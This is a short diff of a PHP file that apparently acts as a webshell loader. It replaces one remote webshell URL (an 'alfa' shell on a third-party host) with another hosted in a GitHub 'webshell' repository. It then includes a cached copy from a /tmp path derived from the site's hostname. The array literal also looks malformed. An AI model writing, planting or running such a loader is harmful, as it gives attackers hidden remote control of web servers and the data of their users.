@@ -1,5 +1,5 @@
 <?php
-$data = ['https://shell.prinsh.com/Nathan/alfa.txt'/tmp/sesssss_'.md5($_SERVER['HTTP_HOST']).'.php'];
+$data = ['https://raw.githubusercontent.com/dorzkim/webshell/main/ikanjambi.unja.-slot88.txt'/tmp/sesssss_'.md5($_SERVER['HTTP_HOST']).'.php'];
  
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
